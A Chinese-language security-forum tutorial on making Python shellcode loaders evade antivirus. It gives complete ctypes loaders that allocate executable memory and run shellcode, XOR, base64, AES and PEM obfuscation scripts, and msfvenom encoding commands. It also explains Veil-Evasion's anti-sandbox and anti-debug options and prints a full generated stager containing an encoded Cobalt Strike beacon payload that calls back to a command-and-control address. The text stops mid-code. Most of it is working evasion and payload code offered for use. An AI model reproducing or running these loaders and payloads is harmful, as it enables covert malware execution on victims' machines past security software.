0x00 前言
=======

python shellcode免杀的常用手法，实现过常见AV的效果。

本文分为几个部分：

1、shellcode加载器实现；

2、代码混淆；

3、寻找免杀api

4、分离免杀，分离加载器与shellcode；

5、python打包成exe

6、组合，免杀效果分析

0x01 shellcode加载器实现
===================

第一个shellcode加载器
---------------

大部分脚本语言加载`Shellcode`都是通过`c`的`ffi`去调用操作系统的`api`，如果我们了解了`C`是怎么加载`Shellcode`的原理，使用时只需要查询一下对应语言的调用方式即可。首先我们要明白，`Shellcode`是一串可执行的二进制代码，那么我们想利用它就可以先通过其他的方法来开辟一段具有读写和执行权限的区域；然后将我们的`Shellcode`放进去，之后跳转到`Shellcode`的首地址去执行就可以了。

我们可以利用`Python`中的`ctypes`库实现这一过程，`ctypes`是`Python`的外部函数库。它提供了与`C`语言兼容的数据类型，并允许调用`DLL`或共享库中的函数。可使用该模块以纯 `Python`形式对这些库进行封装。

**first\_python\_shellcodeloader.py** :

```python
#coding=utf-8
#python的ctypes模块是内建，用来调用系统动态链接库函数的模块
#使用ctypes库可以很方便地调用C语言的动态链接库，并可以向其传递参数。
import ctypes

shellcode = bytearray(b"\xfc\xe8\x89\x00\x00\x00\x60\x89......")   

# 设置VirtualAlloc返回类型为ctypes.c_uint64
#在64位系统上运行，必须使用restype函数设置VirtualAlloc返回类型为ctypes.c_unit64，否则默认的是32位
ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64

# 申请内存：调用kernel32.dll动态链接库中的VirtualAlloc函数申请内存
ptr = ctypes.windll.kernel32.VirtualAlloc(
    ctypes.c_int(0),  #要分配的内存区域的地址
    ctypes.c_int(len(shellcode)), #分配的大小
    ctypes.c_int(0x3000),  #分配的类型，0x3000代表MEM_COMMIT | MEM_RESERVE
    ctypes.c_int(0x40) #该内存的初始保护属性，0x40代表可读可写可执行属性
    )

# 调用kernel32.dll动态链接库中的RtlMoveMemory函数将shellcode移动到申请的内存中
buffered = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
ctypes.windll.kernel32.RtlMoveMemory(
    ctypes.c_uint64(ptr),
    buffered,
    ctypes.c_int(len(shellcode))
)

# 创建一个线程从shellcode放置位置首地址开始执行
handle = ctypes.windll.kernel32.CreateThread(
    ctypes.c_int(0), #指向安全属性的指针
    ctypes.c_int(0), #初始堆栈大小
    ctypes.c_uint64(ptr), #指向起始地址的指针
    ctypes.c_int(0), #指向任何参数的指针
    ctypes.c_int(0), #创建标志
    ctypes.pointer(ctypes.c_int(0)) #指向接收线程标识符的值的指针
)

# 等待上面创建的线程运行完
ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1))

```

使用CS生成shellcode，填入以上代码的shellcode部分，然后运行脚本，即可上线：

![image-20220426161840694.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-ccfc21df5e43f823bc0045477fed5c4271078f7c.png)

![image-20220426162426795.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-8bc4396e3172478ba8e7f06a13e80a00403decb0.png)

![image-20220426162440323.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-f2959a90af8912d0d352478176fa47acc91c775c.png)

然后，我们可以使用pytinstaller、py2exe打包成exe。但是现在并没有任何免杀效果。

为了达到免杀效果，我们需要从多方面去考虑，shellcode特征、加载器特征等， 需要逐个去debug

渐进式加载模式
-------

在申请内存时，一定要把控好属性，可以在Shellcode读入时，申请一个普通的可读写的内存页，然后再通过VirtualProtect改变它的属性 -&gt; 可执行。

```python
#coding=utf-8
import ctypes

shellcode = bytearray(b"\xfc\x48\x83....")

# 设置VirtualAlloc返回类型为ctypes.c_uint64
ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64

# 申请内存：调用kernel32.dll动态链接库中的VirtualAlloc函数申请内存
ptr = ctypes.windll.kernel32.VirtualAlloc(
    ctypes.c_int(0),  #要分配的内存区域的地址
    ctypes.c_int(len(shellcode)), #分配的大小
    ctypes.c_int(0x3000),  #分配的类型，0x3000代表MEM_COMMIT | MEM_RESERVE
    ctypes.c_int(0x04) #该内存的初始保护属性，0x04代表可读可写不可执行属性
    )

# 调用kernel32.dll动态链接库中的RtlMoveMemory函数将shellcode移动到申请的内存中
buffered = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
ctypes.windll.kernel32.RtlMoveMemory(
    ctypes.c_uint64(ptr),
    buffered,
    ctypes.c_int(len(shellcode))
)

# 这里开始更改它的属性为可执行
ctypes.windll.kernel32.VirtualProtect(ptr, len(shellcode), 0x40, ctypes.byref(ctypes.c_long(1)))

# 创建一个线程从shellcode放置位置首地址开始执行
handle = ctypes.windll.kernel32.CreateThread(
    ctypes.c_int(0), #指向安全属性的指针
    ctypes.c_int(0), #初始堆栈大小
    ctypes.c_uint64(ptr), #指向起始地址的指针
    ctypes.c_int(0), #指向任何参数的指针
    ctypes.c_int(0), #创建标志
    ctypes.pointer(ctypes.c_int(0)) #指向接收线程标识符的值的指针
)

# 等待上面创建的线程运行完
ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1))

```

当然现在也有一些杀软对VirtualAlloc和VirtualProtect连用进行查杀

0x02 代码混淆
=========

shellcode混淆
-----------

可用的shellcode混淆方法有很多，如：直接使用aes、des、xor、base64、hex等方法对shellcode进行编码，或者使用现成的工具(msfvenom、veil)对shellcode进行二进制形式的混淆，或者反序列化混淆等，再将其中的几种进行结合以达到更好的效果。这里我们演示其中的几种。

### base64

base64的实现比较简单，但是单独使用效果不怎么样，一般会与其他方法配合使用。

**shellcode\_base64\_encode.py：**

```python
import base64

buf1 = b"\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00..."

#b64shellcode = base64.b64encode(buf1)                   # b'xxxx'
b64shellcode = base64.b64encode(buf1).decode('ascii')    #获取纯字符串

print(b64shellcode)
```

![image-20220426172231862.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-5ce9c6264fb431aced747cf53b42e4934ab84a76.png)

我们加载器相应的需要进行base64解码，只需改前两行就可以，把生成的base64填入

**first\_base64\_decode\_shellcodeloader.py:**

```python
import base64
import ctypes

shellcode = base64.b64decode(b'/EiD5PDoyAAAAEF......')

shellcode = bytearray(shellcode)

# 设置VirtualAlloc返回类型为ctypes.c_uint64
ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64

# 申请内存：调用kernel32.dll动态链接库中的VirtualAlloc函数申请内存
ptr = ctypes.windll.kernel32.VirtualAlloc(
    ctypes.c_int(0),  #要分配的内存区域的地址
    ctypes.c_int(len(shellcode)), #分配的大小
    ctypes.c_int(0x3000),  #分配的类型，0x3000代表MEM_COMMIT | MEM_RESERVE
    ctypes.c_int(0x40) #该内存的初始保护属性，0x40代表可读可写可执行属性
    )

# 调用kernel32.dll动态链接库中的RtlMoveMemory函数将shellcode移动到申请的内存中
buffered = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
ctypes.windll.kernel32.RtlMoveMemory(
    ctypes.c_uint64(ptr),
    buffered,
    ctypes.c_int(len(shellcode))
)

# 创建一个线程从shellcode放置位置首地址开始执行
handle = ctypes.windll.kernel32.CreateThread(
    ctypes.c_int(0), #指向安全属性的指针
    ctypes.c_int(0), #初始堆栈大小
    ctypes.c_uint64(ptr), #指向起始地址的指针
    ctypes.c_int(0), #指向任何参数的指针
    ctypes.c_int(0), #创建标志
    ctypes.pointer(ctypes.c_int(0)) #指向接收线程标识符的值的指针
)

# 等待上面创建的线程运行完
ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1))

```

运行上面的代码，即可上线

### xor

异或加密算是最简单高效的方法。

利用CS生成raw格式的shellcode，然后用python读取shellcode对其中的字节一个一个的做异或。

**shellcode\_xor\_encode.py:**

```python
# __*__coding:utf-8 __*__
from optparse import OptionParser
import sys

def xorEncode(file,key,output):
    shellcode = ""
    shellcode_size = 0
    while True:
        code = file.read(1)
        if not code :
            break
        code = ord(code) ^ key
        code_hex = hex(code)
        code_hex = code_hex.replace("0x",'')
        if len(code_hex) == 1:
            code_hex = '0'+code_hex
        shellcode += '\\x' + code_hex
        shellcode_size += 1
    file.close()
    output.write(shellcode)
    output.close()
    print(f"shellcodeSize:{shellcode_size}")

if __name__== "__main__":
    usage = "usage: %prog [-f] input_filename [-k] key [-o] output_filename"
    parser = OptionParser(usage=usage)
    parser.add_option("-f","--file",help="input raw shellcode file",type="string",dest="file")
    parser.add_option("-k","--key",help="xor key",type="int",dest="key",default=11)
    parser.add_option("-o","--output",help="output x16 shellcode file",type="string",dest="output")

    if len(sys.argv) < 4:
        parser.print_help()
        exit()

    (options, params) = parser.parse_args()
    with open(options.file,'rb') as file:
        with open(options.output,'w+') as output:
            xorEncode(file,options.key,output)

```

![image-20220427140505425.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-e83223c69e2276a9d3998ea5e5a1246b83d32f21.png)

这样shellcode就完成了异或加密。

接下来我们加载器相应的需要进行异或解密，注意key要一样

**xor\_decode\_shellcodeloader.py :**

```python
import ctypes

#xor shellcode
xor_shellcode = "生成的xor shellcode"

#xor key
key = 11

shellcode = bytearray([ord(xor_shellcode[i]) ^ key for i in range(len(xor_shellcode))])

# 设置VirtualAlloc返回类型为ctypes.c_uint64
ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64

# 申请内存：调用kernel32.dll动态链接库中的VirtualAlloc函数申请内存
ptr = ctypes.windll.kernel32.VirtualAlloc(
    ctypes.c_int(0),  #要分配的内存区域的地址
    ctypes.c_int(len(shellcode)), #分配的大小
    ctypes.c_int(0x3000),  #分配的类型，0x3000代表MEM_COMMIT | MEM_RESERVE
    ctypes.c_int(0x40) #该内存的初始保护属性，0x40代表可读可写可执行属性
    )

# 调用kernel32.dll动态链接库中的RtlMoveMemory函数将shellcode移动到申请的内存中
buffered = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
ctypes.windll.kernel32.RtlMoveMemory(
    ctypes.c_uint64(ptr),
    buffered,
    ctypes.c_int(len(shellcode))
)

# 创建一个线程从shellcode放置位置首地址开始执行
handle = ctypes.windll.kernel32.CreateThread(
    ctypes.c_int(0), #指向安全属性的指针
    ctypes.c_int(0), #初始堆栈大小
    ctypes.c_uint64(ptr), #指向起始地址的指针
    ctypes.c_int(0), #指向任何参数的指针
    ctypes.c_int(0), #创建标志
    ctypes.pointer(ctypes.c_int(0)) #指向接收线程标识符的值的指针
)

# 等待上面创建的线程运行完
ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1))

```

运行上面的代码，即可上线

![image-20220427143608281.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-5793c9499b8863261192f2a1365f29f8acd91336.png)

![image-20220427143619320.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-d44cdf510592f9df16982209eaf81356359ddf0b.png)

### PyCryptodome 库

这里用到 PyCryptodome 库，它可以实现各种加密方式的加解密。

官方文档：<https://pycryptodome.readthedocs.io/en/latest/>

可用的加密方式：

```php
Symmetric ciphers:
AES
Single and Triple DES (legacy)
CAST-128 (legacy)
RC2 (legacy)

Traditional modes of operations for symmetric ciphers:
ECB
CBC
CFB
OFB
CTR
OpenPGP (a variant of CFB, RFC4880)

Authenticated Encryption:
CCM (AES only)
EAX
GCM (AES only)
SIV (AES only)
OCB (AES only)
ChaCha20-Poly1305

Stream ciphers:
Salsa20
ChaCha20
RC4 (legacy)
Cryptographic hashes:
SHA-1
SHA-2 hashes (224, 256, 384, 512, 512/224, 512/256)
SHA-3 hashes (224, 256, 384, 512) and XOFs (SHAKE128, SHAKE256)
Functions derived from SHA-3 (cSHAKE128, cSHAKE256, TupleHash128, TupleHash256)
KangarooTwelve (XOF)
Keccak (original submission to SHA-3)
BLAKE2b and BLAKE2s
RIPE-MD160 (legacy)
MD5 (legacy)
Message Authentication Codes (MAC):
HMAC
CMAC
KMAC128 and KMAC256
Poly1305
Asymmetric key generation:
RSA
ECC (NIST curves P-192, P-224, P-256, P-384 and P-521)
DSA
ElGamal (legacy)

Export and import format for asymmetric keys:
PEM (clear and encrypted)
PKCS#8 (clear and encrypted)
ASN.1 DER
Asymmetric ciphers:
PKCS#1 (RSA)
RSAES-PKCS1-v1_5
RSAES-OAEP

Asymmetric digital signatures:
PKCS#1 (RSA)
RSASSA-PKCS1-v1_5
RSASSA-PSS
(EC)DSA
Nonce-based (FIPS 186-3)
Deterministic (RFC6979)
Key derivation:
PBKDF2
scrypt
HKDF
PBKDF1 (legacy)

Other cryptographic protocols:
Shamir Secret Sharing
Padding
PKCS#7
ISO-7816
X.923
```

API：

![image-20220427152833876.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-29f73947b3129ddbda16580a03ca1d8f800fa889.png)

安装：

```php
pip install pycryptodome -i https://pypi.douban.com/simple
```

下面演示几种，更多的可以自己去探索。

#### AES

参考文档：

<https://pycryptodome.readthedocs.io/en/latest/src/cipher/aes.html>

具体我这里就不再展开了。

直接用：

加密，CBC模式

**shellcode\_aes\_encode.py:**

```python
from base64 import b64encode
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes

shellcode = b"\xfc\x48\x83\xe4\xf0...."

key = get_random_bytes(16)
cipher = AES.new(key, AES.MODE_CBC)
ct_bytes = cipher.encrypt(pad(shellcode, AES.block_size))
iv = b64encode(cipher.iv).decode('utf-8')
ct = b64encode(ct_bytes).decode('utf-8')

print('iv: \n {} \n key:\n {} \n ase_shellcode:\n {} \n'.format(iv,key,ct))

```

![image-20220427160841004.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-c2c352c9d6588b5c4c77f9ec2d4757e061f3fe5b.png)

解密，并加载：

**aes\_decode\_shellcodeloader.py:**

```python
import ctypes
from base64 import b64decode
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

#把加密代码输出的结果填到下面
iv='xxx'
key=b'xxx'
ase_shellcode='xxx'

iv = b64decode(iv)
ase_shellcode = b64decode(ase_shellcode)
cipher = AES.new(key, AES.MODE_CBC, iv)

shellcode = bytearray(unpad(cipher.decrypt(ase_shellcode), AES.block_size))

# 设置VirtualAlloc返回类型为ctypes.c_uint64
ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64

# 申请内存：调用kernel32.dll动态链接库中的VirtualAlloc函数申请内存
ptr = ctypes.windll.kernel32.VirtualAlloc(
    ctypes.c_int(0),  #要分配的内存区域的地址
    ctypes.c_int(len(shellcode)), #分配的大小
    ctypes.c_int(0x3000),  #分配的类型，0x3000代表MEM_COMMIT | MEM_RESERVE
    ctypes.c_int(0x40) #该内存的初始保护属性，0x40代表可读可写可执行属性
    )

# 调用kernel32.dll动态链接库中的RtlMoveMemory函数将shellcode移动到申请的内存中
buffered = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
ctypes.windll.kernel32.RtlMoveMemory(
    ctypes.c_uint64(ptr),
    buffered,
    ctypes.c_int(len(shellcode))
)

# 创建一个线程从shellcode放置位置首地址开始执行
handle = ctypes.windll.kernel32.CreateThread(
    ctypes.c_int(0), #指向安全属性的指针
    ctypes.c_int(0), #初始堆栈大小
    ctypes.c_uint64(ptr), #指向起始地址的指针
    ctypes.c_int(0), #指向任何参数的指针
    ctypes.c_int(0), #创建标志
    ctypes.pointer(ctypes.c_int(0)) #指向接收线程标识符的值的指针
)

# 等待上面创建的线程运行完
ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1))

```

运行上面代码，即可上线：

![image-20220427162155304.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-ac8870a7135776c8f3abc84da1be2dd6c0af00a5.png)

![image-20220427162207981.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-6e064916230b95c8c2115da5ac88f82e0f999716.png)

#### PEM

加密

```python
from Crypto.IO import PEM

buf = b""
# 加密
# passphrase：指定密钥
# marker：指定名称
buf = PEM.encode(buf, marker="shellcode", passphrase=None, randfunc=None)
```

解密，加载

```python
import ctypes
from Crypto.IO import PEM

# 加密后的shellcode
buf = """ """
# 解密
shellcode = bytearray(PEM.decode(buf, passphrase=None)[0])
...
...
```

测试：

![image-20220427163140983.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-01be3ee6c92e916f39fc1c6cf76bb129eea7cf05.png)

![image-20220427163220949.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-d5feefc724f23b109d1ecc6675aa1162169f0d2b.png)

![image-20220427163233699.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-446b9aa18a0799067713e3947003c59727fa1674.png)

### msfvenom

**对CS生成的payload 使用msfvenom编码**

```php
// -f 指定输出格式，可以生成任意格式的shellcode 。 
//源文件（cat 的shellcode) 可以是二进制或16进制的shellcode(cs生成raw/c/py)

cat payload.bin |msfvenom -e x64/xor -o test.bin -a x64 --platform windows 
//生成的test.bin 是二进制shellcode，可以再转成16进制用C或python写加载器加载

cat shellcode.txt |msfvenom -e x64/xor -o xor_shellcode.py -a x64 --platform windows -f python
//shellcode.txt 是16进制shellcode，

//-e 编码方式(x86/shikata_ga_nai)    
//-i 编码次数
//-b 在生成的程序中避免出现的值 ( 过滤坏字符 '\x00，\xff')  
```

测试：

msfvenom对cs生成的raw格式的shellcode进行编码，输出python格式的编码

![image-20220427171427586.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-8d64b0eeb8c482a92a1caf8b4d47628a3c959709.png)

![image-20220427171439619.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-0104594ad697508749c792d8a4afd9ef5cb3d681.png)

提取出来，放到加载器，运行即可：

![image-20220427171331817.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-a73ea774d2f60a54183e55e4eee8a55c52aed3e3.png)

![image-20220427171343468.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-ec2d9edbb173603df38678e60e9391fa9802a659.png)

### veil

可以使用veil对CS生成的16进制shellcode进行处理

![image-20220428144103459.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-776707fcfdee24e03d071c23f2c7fe471bda96f0.png)

**Veil docker版本：**

拉取镜像  
`docker pull mattiasohlsson/veil`  
启动容器  
`docker run -it -v /tmp/veil-output:/var/lib/veil/output:Z mattiasohlsson/veil`  
其中/tmp/veil-output为我物理机系统的路径

之后再进入镜像可以在启动镜像后使用下面命令

```php
docker exec -it 容器ID /bin/bash
```

![image-20220427174742081.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-1ecb96dac00d5d34f6c8f468ea1e41c8855d42b6.png)

Veil主要分为两个功能：

![image-20220427174804755.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-a0c91f2766d5c8ea2268b4095f0c72babd615e71.png)

这里使用到的是 Evasion 。

使用list 看到41种stager

![image-20220428163324021.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-c235462c97745b56023a672b808d70cca43d032c.png)

这里用到的是python相关的几个

```php
    29) python/shellcode_inject/aes_encrypt.py
    30) python/shellcode_inject/arc_encrypt.py
    31) python/shellcode_inject/base64_substitution.py
    32) python/shellcode_inject/des_encrypt.py
    33) python/shellcode_inject/flat.py
    34) python/shellcode_inject/letter_substitution.py
    35) python/shellcode_inject/pidinject.py
    36) python/shellcode_inject/stallion.py
```

我们以`31) python/shellcode_inject/base64_substitution.py`演示一下：

`use 31`

接下来看到以下设置，意思是该stager执行时执行哪些检查与必要的配置（可以保证只有在满足指定条件时才会注入并执行嵌入的shellcode从而避免被沙箱等引擎行为分析）

![image-20220428165148338.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-4f696b738171901aba8609ba896b0553c48c01d4.png)

具体解释下：

```php
**BADMACS** 设置为Y表示查看运行环境的MAC地址如果不是虚拟机才会执行payload （反调试）

**CLICKTRACK** 设置为4表示 表示需要4次点击才会执行

**COMPILE_TO_EXE** 设置为Y表示 编译为exe文件

**DISKSIZE** 设置为100表示 运行环境的硬盘大小如果大于100GB才会执行payload （反沙箱）

**HOSTNAME** 设置为Comp1表示 只有在Hostname计算机名为Comp1时才会执行payload（指定目标环境 反沙箱的方式）

**INJECT_METHOD** 可设置为Virtual 或 Heap

**MINPROCS** 设置为20表示 只有运行环境的运行进程数大于20时才会执行payload（指定目标环境 反沙箱的方式）

**PROCCHECK** 设置为Y表示 只有运行环境的进程中没有虚拟机进程时才会执行payload（指定目标环境 反沙箱的方式）

**PROCESSORS** 设置为2表示 只在至少2核的机器中才会执行payload（指定目标环境 反沙箱的方式）

**RAMCHECK** 设置为Y表示 只在运行环境的内存为3G以上时才会执行payload（指定目标环境 反沙箱的方式）

**SLEEP** 设置为10表示 休眠10秒 以检测是否运行过程中被加速（反沙箱）

**USERNAME** 设置为Tom表示 只有在当前用户名为Tom的机器中才执行payload。

**USERPROMPT** 设置为Y表示 在injection之前提醒用户（提示一个错误框，让用户误以为该程序执行错误才无法打开）

**DEBUGGER** 设置为Y表示 当被调试器不被attached时才会执行payload （反调试）

**DOMAIN** 设置为Comp表示 受害者计算机只有加入Comp域中时，才会执行payload（指定目标环境 反沙箱的方式）

**UTCCHECK** 设置为Y表示 只在运行环境的系统使用UTC时间时，才会执行payload
```

这里简单设置几个

![image-20220428165407998.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-4e6253e5006ff91f92008055e4c4d9feccf88e7b.png)

然后输入，`generate`，然后选择3

![image-20220428165600386.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-8bda7e2de985094005f3abab06fc9510c3b2e4c3.png)

输入CS的16进制 shellcode字符串:

![image-20220428165535040.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-a84f140e797bcdf1d505a86fb186d9da7bf735e6.png)

然后输入生成文件的名称for\_test, 生成了2个文件：

![image-20220428165652373.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-35798769b7aa2aa61c0a572be980cd9a199a8095.png)

![image-20220428165700319.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-629bc0d5b641c6f33c0080fc0d483e6755ede7c1.png)

![image-20220428165711066.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-611f45e1d05f59e6f30d213e76d2ebd231d6fd75.png)

来看一下生成的代码：

**base64\_sanbox\_test.py**

```python
import win32api
rYvnOAL = 0
iQNSBwRpPNii = 4
while rYvnOAL < iQNSBwRpPNii:
    oRZxcjjWNWxMTV = win32api.GetAsyncKeyState(1)
    SxQGYer = win32api.GetAsyncKeyState(2)
    if oRZxcjjWNWxMTV % 2 == 1:
        rYvnOAL += 1
    if SxQGYer % 2 == 1:
        rYvnOAL += 1
if rYvnOAL >= iQNSBwRpPNii:
    import time as KWZIlBfZMcYj
    if KWZIlBfZMcYj.tzname[0] != "Coordinated Universal Time" and KWZIlBfZMcYj.tzname[1] != "Coordinated Universal Time":
        from time import sleep
        from socket import AF_INET, SOCK_DGRAM
        import sys
        import datetime
        import time
        import socket
        import struct
        client = socket.socket(AF_INET, SOCK_DGRAM)
        client.sendto((bytes.fromhex("1b") + 47 * bytes.fromhex("01")), ("us.pool.ntp.org",123))
        msg, address = client.recvfrom( 1024 )
        QwIeOKFgBDkV = datetime.datetime.fromtimestamp(struct.unpack("!12I",msg)[10] - 2208988800)
        sleep(10)
        client.sendto((bytes.fromhex("1b") + 47 * bytes.fromhex("01")), ("us.pool.ntp.org",123))
        msg, address = client.recvfrom( 1024 )
        if ((datetime.datetime.fromtimestamp((struct.unpack("!12I",msg)[10] - 2208988800)) - QwIeOKFgBDkV).seconds >= 10):
            import ctypes as ycVksxvEXqvTANC
            import base64
            hmyBiUmcHsutivM = base64.b64decode("/EiD5PDoyAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwJ1couAiAAAAEiFwHRnSAHQUItIGESLQCBJAdDjVkj/yUGLNIhIAdZNMclIMcCsQcHJDUEBwTjgdfFMA0wkCEU50XXYWESLQCRJAdBmQYsMSESLQBxJAdBBiwSISAHQQVhBWF5ZWkFYQVlBWkiD7CBBUv/gWEFZWkiLEulP////XWoASb53aW5pbmV0AEFWSYnmTInxQbpMdyYH/9VIMclIMdJNMcBNMclBUEFQQbo6Vnmn/9Xrc1pIicFBuFAAAABNMclBUUFRagNBUUG6V4mfxv/V61lbSInBSDHSSYnYTTHJUmgAAkCEUlJBuutVLjv/1UiJxkiDw1BqCl9IifFIidpJx8D/////TTHJUlJBui0GGHv/1YXAD4WdAQAASP/PD4SMAQAA69Pp5AEAAOii////LzRteEQAp9Aj4CqXYbbIwHANt0VcayUT6GfUbiCX+qjtquwmOrievppIiuOWfNniEdCWAF7js5vbahKPjrUjon47f5JP79wIKCw84ql6JABVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoY29tcGF0aWJsZTsgTVNJRSA5LjA7IFdpbmRvd3MgTlQgNi4xOyBXaW42NDsgeDY0OyBUcmlkZW50LzUuMDsgTUFBVTsgTlAwOCkNCgAYZADngQNwh2cj52nugbTcxg6nAqiGJ9aKZHF0UzytK8rYtQ/Ue44z2BrXSJXR+jQZ0NuVJ5wsbYDW4+BnA5XpAixgwvPUl2NgN9uvL13TtnDrtzlYcRTypNyby6fLmF47VktLOpJQ8spLj2799CdoePvnZLMU7ZSCupFZEmJ7t95KUW0Hv7GkJatMMXMb8JiDNj+Q4b/VQAqSThp/eNg1NiTtEE7u+UwREUSGfhqF8Yjkzj7Jsgtpg3LCmej9Lm8LN9l+L7zRBF8AQb7wtaJW/9VIMcm6AABAAEG4ABAAAEG5QAAAAEG6WKRT5f/VSJNTU0iJ50iJ8UiJ2kG4ACAAAEmJ+UG6EpaJ4v/VSIPEIIXAdLZmiwdIAcOFwHXXWFhYSAUAAAAAUMPon/3//zE5Mi4xNjguMTExLjEzMQASNFZ4")
            rMXYpPMXynT = ycVksxvEXqvTANC.windll.kernel32.VirtualAlloc(ycVksxvEXqvTANC.c_int(0),ycVksxvEXqvTANC.c_int(len(hmyBiUmcHsutivM)),ycVksxvEXqvTANC.c_int(0x3000),ycVksxvEXqvTANC.c_int(0x04))
            ycVksxvEXqvTANC.windll.kernel32.RtlMoveMemory(ycVksxvEXqvTANC.c_int(rMXYpPMXynT),hmyBiUmcHsutivM,ycVksxvEXqvTANC.c_int(len(hmyBiUmcHsutivM)))
            pmRnvgX = ycVksxvEXqvTANC.windll.kernel32.VirtualProtect(ycVksxvEXqvTANC.c_int(rMXYpPMXynT),ycVksxvEXqvTANC.c_int(len(hmyBiUmcHsutivM)),ycVksxvEXqvTANC.c_int(0x20),ycVksxvEXqvTANC.byref(ycVksxvEXqvTANC.c_uint32(0)))
            IXUkyI = ycVksxvEXqvTANC.windll.kernel32.CreateThread(ycVksxvEXqvTANC.c_int(0),ycVksxvEXqvTANC.c_int(0),ycVksxvEXqvTANC.c_int(rMXYpPMXynT),ycVksxvEXqvTANC.c_int(0),ycVksxvEXqvTANC.c_int(0),ycVksxvEXqvTANC.pointer(ycVksxvEXqvTANC.c_int(0)))
            ycVksxvEXqvTANC.windll.kernel32.WaitForSingleObject(ycVksxvEXqvTANC.c_int(IXUkyI),ycVksxvEXqvTANC.c_int(-1))
```

生成了一些反沙箱的代码。

作为对比，我们啥都不修改，直接生成看一下：

**base64\_test.py**

```python
import ctypes as utHlfsE
import base64
znDuyLotmJPitl = base64.b64decode("/EiD5PDoyAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwJ1couAiAAAAEiFwHRnSAHQUItIGESLQCBJAdDjVkj/yUGLNIhIAdZNMclIMcCsQcHJDUEBwTjgdfFMA0wkCEU50XXYWESLQCRJAdBmQYsMSESLQBxJAdBBiwSISAHQQVhBWF5ZWkFYQVlBWkiD7CBBUv/gWEFZWkiLEulP////XWoASb53aW5pbmV0AEFWSYnmTInxQbpMdyYH/9VIMclIMdJNMcBNMclBUEFQQbo6Vnmn/9Xrc1pIicFBuFAAAABNMclBUUFRagNBUUG6V4mfxv/V61lbSInBSDHSSYnYTTHJUmgAAkCEUlJBuutVLjv/1UiJxkiDw1BqCl9IifFIidpJx8D/////TTHJUlJBui0GGHv/1YXAD4WdAQAASP/PD4SMAQAA69Pp5AEAAOii////LzRteEQAp9Aj4CqXYbbIwHANt0VcayUT6GfUbiCX+qjtquwmOrievppIiuOWfNniEdCWAF7js5vbahKPjrUjon47f5JP79wIKCw84ql6JABVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoY29tcGF0aWJsZTsgTVNJRSA5LjA7IFdpbmRvd3MgTlQgNi4xOyBXaW42NDsgeDY0OyBUcmlkZW50LzUuMDsgTUFBVTsgTlAwOCkNCgAYZADngQNwh2cj52nugbTcxg6nAqiGJ9aKZHF0UzytK8rYtQ/Ue44z2BrXSJXR+jQZ0NuVJ5wsbYDW4+BnA5XpAixgwvPUl2NgN9uvL13TtnDrtzlYcRTypNyby6fLmF47VktLOpJQ8spLj2799CdoePvnZLMU7ZSCupFZEmJ7t95KUW0Hv7GkJatMMXMb8JiDNj+Q4b/VQAqSThp/eNg1NiTtEE7u+UwREUSGfhqF8Yjkzj7Jsgtpg3LCmej9Lm8LN9l+L7zRBF8AQb7wtaJW/9VIMcm6AABAAEG4ABAAAEG5QAAAAEG6WKRT5f/VSJNTU0iJ50iJ8UiJ2kG4ACAAAEmJ+UG6EpaJ4v/VSIPEIIXAdLZmiwdIAcOFwHXXWFhYSAUAAAAAUMPon/3//zE5Mi4xNjguMTExLjEzMQASNFZ4")
